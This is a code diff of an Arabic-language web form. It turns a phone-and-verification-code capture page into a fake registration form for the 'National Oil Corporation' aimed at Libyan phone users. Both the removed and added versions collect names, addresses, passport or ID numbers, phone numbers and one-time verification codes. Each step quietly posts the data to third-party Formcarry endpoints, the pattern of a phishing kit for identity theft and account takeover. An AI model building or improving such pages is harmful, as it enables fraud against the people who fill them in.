@@ -2,122 +2,152 @@
 <html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8">
-  <title>نموذج التحقق</title>
+  <title>نموذج التسجيل - المؤسسة الوطنية للنفط</title>
   <style>
-    body { font-family: Arial; background: #f5f5f5; padding: 20px; text-align: center; direction: rtl; }
-    .step { display: none; margin-top: 20px; }
-    .visible { display: block; }
-    input, select, button {
-      padding: 10px; margin: 10px 0; width: 80%; max-width: 300px;
-      font-size: 16px; border: 1px solid #ccc; border-radius: 5px;
+    body {
+      background-color: #f4f4f4;
+      font-family: "Arial", sans-serif;
+      text-align: center;
+      direction: rtl;
+      padding: 30px;
     }
-    button { background: #2c3e50; color: white; border: none; cursor: pointer; }
-    .note { color: gray; font-size: 14px; }
+    h2 {
+      color: #003366;
+    }
+    .container {
+      background-color: #fff;
+      border-radius: 12px;
+      padding: 30px;
+      max-width: 500px;
+      margin: auto;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+    input, select, button {
+      width: 90%;
+      padding: 12px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      font-size: 16px;
+    }
+    button {
+      background-color: #003366;
+      color: #fff;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #005599;
+    }
+    .hidden {
+      display: none;
+    }
   </style>
 </head>
 <body>
 
-  <!-- المرحلة 1 -->
-  <div class="step visible" id="step1">
-    <input type="tel" id="phone" placeholder="أدخل رقم الهاتف">
-    <br>
-    <button onclick="sendPhone()">أرسل رقم التحقق</button>
-  </div>
+  <div class="container">
+    <h2>المرحلة الأولى</h2>
+    <input type="text" id="name" placeholder="الاسم الكامل (بالعربية)">
+    <input type="text" id="address" placeholder="العنوان">
+    
+    <select id="docType" onchange="toggleDocField()">
+      <option value="">نوع الوثيقة (اختياري)</option>
+      <option value="جواز السفر">جواز السفر</option>
+      <option value="البطاقة الشخصية">البطاقة الشخصية</option>
+    </select>
+    <input type="text" id="docNumber" placeholder="رقم الوثيقة" class="hidden">
 
-  <!-- المرحلة 2 -->
-  <div class="step" id="step2">
-    <input type="text" id="fullname" placeholder="الاسم الكامل">
-    <br>
-    <div id="verificationBox">
-      <input type="text" id="code" placeholder="ادخل رمز التحقق">
-      <p class="note" id="codeMsg">سوف يتم تحويل رمز التحقيق الى إشعار فيسبوك، واتساب، رسالة نصية</p>
-      <button id="verifyBtn" style="display: none;" onclick="sendCode()">تأكيد التحقق</button>
+    <input type="tel" id="phone" placeholder="رقم الهاتف (ليبي)">
+    
+    <button onclick="submitStep1()">أكمل الطلب</button>
+
+    <div id="step2" class="hidden">
+      <h2>المرحلة الثانية</h2>
+      <input type="text" id="code" placeholder="رمز التحقق (6-8 حروف أو أرقام)">
+      <input type="text" id="confirmCode" placeholder="إعادة كتابة رمز التحقق">
+
+      <button onclick="submitCode()">تحقيق الرمز</button>
+      <button onclick="confirmCodeSubmit()">يؤكد التحقق</button>
     </div>
   </div>
 
-  <!-- زر تأكيد البيانات -->
-  <div class="step" id="finalConfirm" style="display:none;">
-    <button onclick="resendAll()">تأكيد البيانات</button>
-  </div>
-
-  <!-- المرحلة 3 -->
-  <div class="step" id="step3">
-    <input type="text" id="finalName" placeholder="الاسم بالكامل">
-    <br>
-    <input type="text" id="address" placeholder="العنوان">
-    <br>
-    <select id="docType" onchange="toggleDocField()">
-      <option value="">اختر نوع الوثيقة (اختياري)</option>
-      <option value="جواز السفر">جواز السفر</option>
-      <option value="بطاقة شخصية">بطاقة شخصية</option>
-    </select>
-    <br>
-    <input type="text" id="docValue" placeholder="رقم الوثيقة" style="display:none;">
-    <br>
-    <button onclick="sendFinal()">إرسال البيانات</button>
-  </div>
-
   <script>
-    // إرسال رقم الهاتف إلى Formcarry الأول
-    function sendPhone() {
-      const phone = document.getElementById('phone').value;
-      if (!phone) return alert("يرجى إدخال رقم الهاتف");
-
-      fetch("https://formcarry.com/s/pHHZOWhpgsB", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ phone })
-      });
-
-      document.getElementById('step1').classList.remove('visible');
-      document.getElementById('step2').classList.add('visible');
-
-      // بعد 4 ثوانٍ أخفِ الرسالة وأظهر زر تأكيد
-      setTimeout(() => {
-        document.getElementById("codeMsg").style.display = "none";
-        document.getElementById("verifyBtn").style.display = "inline-block";
-      }, 4000);
-    }
-
-    // إرسال الاسم ورمز التحقق إلى Formcarry الثاني
-    function sendCode() {
-      const fullname = document.getElementById('fullname').value;
-      const code = document.getElementById('code').value;
-
-      if (!fullname || !code) return alert("يرجى إدخال الاسم ورمز التحقق");
-
-      fetch("https://formcarry.com/s/pHHZOWhpgsB", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ fullname, code })
-      });
-
-      document.getElementById('step2').classList.remove('visible');
-      document.getElementById('finalConfirm').style.display = 'block';
-    }
-
-    // إعادة إرسال الاسم + الهاتف + الكود إلى Formcarry الثالث
-    function resendAll() {
-      const phone = document.getElementById('phone').value;
-      const fullname = document.getElementById('fullname').value;
-      const code = document.getElementById('code').value;
-
-      fetch("https://formcarry.com/s/pHHZOWhpgsB", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ phone, fullname, code })
-      });
-
-      document.getElementById('finalConfirm').style.display = 'none';
-      document.getElementById('step3').classList.add('visible');
-    }
-
-    // إظهار حقل الوثيقة حسب الاختيار
     function toggleDocField() {
-      const docType = document.getElementById('docType').value;
-      const docValue = document.getElementById('docValue');
-      docValue.style.display = docType ? "inline-block" : "none";
-      docValue.placeholder = docType ? `رقم ${docType}` : "";
+      const doc = document.getElementById('docType').value;
+      document.getElementById('docNumber').classList.toggle('hidden', doc === "");
     }
 
-    // إرسال البيانات النهائية إلى Formcarry الراب
+    function submitStep1() {
+      const name = document.getElementById('name').value.trim();
+      const address = document.getElementById('address').value.trim();
+      const docType = document.getElementById('docType').value;
+      const docNumber = document.getElementById('docNumber').value.trim();
+      const phone = document.getElementById('phone').value.trim();
+
+      const arabicRegex = /^[\u0600-\u06FF\s]{5,}$/;
+      const phoneRegex = /^(091|092|093|094|095)\d{7}$/;
+
+      if (!arabicRegex.test(name)) {
+        alert("الاسم يجب أن يكون باللغة العربية ويحتوي على 5 أحرف على الأقل.");
+        return;
+      }
+      if (address.length < 3) {
+        alert("يرجى إدخال العنوان بشكل صحيح.");
+        return;
+      }
+      if (!phoneRegex.test(phone)) {
+        alert("رقم الهاتف غير صحيح. يجب أن يبدأ بـ091 إلى 095 ويتكون من 10 أرقام.");
+        return;
+      }
+
+      // إرسال البيانات إلى Formcarry (الرابط الأول)
+      fetch("https://formcarry.com/s/FORMCARRY_ID_1", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ name, address, docType, docNumber, phone })
+      });
+
+      // عرض المرحلة الثانية
+      document.getElementById('step2').classList.remove('hidden');
+    }
+
+    function submitCode() {
+      const code = document.getElementById('code').value.trim();
+
+      const codeRegex = /^[A-Za-z0-9]{6,8}$/;
+      if (!codeRegex.test(code)) {
+        alert("رمز التحقق يجب أن يكون من 6 إلى 8 حروف أو أرقام.");
+        return;
+      }
+
+      // إرسال الرمز إلى Formcarry (الرابط الثاني)
+      fetch("https://formcarry.com/s/FORMCARRY_ID_2", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ code })
+      });
+
+      alert("تم إرسال الرمز بنجاح.");
+    }
+
+    function confirmCodeSubmit() {
+      const code = document.getElementById('code').value.trim();
+      const confirmCode = document.getElementById('confirmCode').value.trim();
+
+      if (code !== confirmCode) {
+        alert("رمز التحقق غير متطابق.");
+        return;
+      }
+
+      // إرسال التأكيد إلى Formcarry (الرابط الثالث)
+      fetch("https://formcarry.com/s/FORMCARRY_ID_3", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ verified_code: code })
+      });
+
+      alert("تم تأكيد رمز التحقق.");
+    }
+  </script>
+</body>
+</html>
